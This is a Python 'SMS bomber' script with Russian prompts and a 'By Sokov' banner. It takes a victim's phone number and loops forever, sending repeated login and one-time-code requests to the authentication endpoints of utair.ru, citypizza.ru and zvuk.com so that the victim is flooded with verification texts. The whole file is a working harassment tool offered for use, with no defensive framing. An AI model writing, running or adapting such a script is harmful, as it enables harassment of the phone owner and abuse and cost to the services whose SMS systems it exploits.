import sys
import requests
import time
#Лого
print (''' ____                ____            __                        
/\  _`\             /\  _`\         /\ \                       
\ \ \L\ \  __  __   \ \,\L\_\    ___\ \ \/'\     ___   __  __  
 \ \  _ <'/\ \/\ \   \/_\__ \   / __`\ \ , <    / __`\/\ \/\ \ 
  \ \ \L\ \ \ \_\ \    /\ \L\ \/\ \L\ \ \ \\`\ /\ \L\ \ \ \_/ |
   \ \____/\/`____ \   \ `\____\ \____/\ \_\ \_\ \____/\ \___/ 
    \/___/  `/___/> \   \/_____/\/___/  \/_/\/_/\/___/  \/__/  
               /\___/                                          
               \/__/                                         
''')

time.sleep(2)
print ("НОМЕР НУЖНО ПИСАТЬ БЕЗ ЗНАКА +")
#переменные
n = input("Укажите номер: ")
n2 = ("(" + n[1:-7] + ")" + n[4:-4] + ("-") + n[7:-2] + ("-") + n[9:]) 
n3= ("7"+n[1:])
n4=("+"+n3)
link1 = ('https://zvuk.com/api/tiny/get-otp?phone=' + (n4) + ("&length=4&type=login"))
print ("Спам запущен на номер", n)

#all


# utair

while True:


 while True:
  r = requests.post('https://b.utair.ru/api/v1/login/',
  data = {'login':n},
  headers = {
  'Accept-Language':'en-US,en;q=0.5',
  'Connection':'keep-alive',
  'Host':'b.utair.ru',
  'origin':'https://www.utair.ru',
  'Referer':'https://www.utair.ru/'})
  time.sleep(5)   
  break
#citypizza

 while True:
   requests.post('https://www.citypizza.ru/auth/sendphone/',
   data = {'phone':n2},
   headers = {
   'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
   'Connection':'keep-alive',
   'Host':'www.citypizza.ru',
   'Origin':'""',
   'Referer':'https://www.citypizza.ru/auth/register/'})
   time.sleep(5)
   break
         
 while True:
  r = requests.post((link1),
  data = {'phone':n3, 'length':'4','type':'login'},
  headers = {
  'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
  'Connection':'keep-alive',
  'Host':'zvuk.com',
  'Origin':'https://zvuk.com',
  'Referer':'https://zvuk.com/'})
  time.sleep(5)
  break
  


	
	
	
	
	
	
	
	








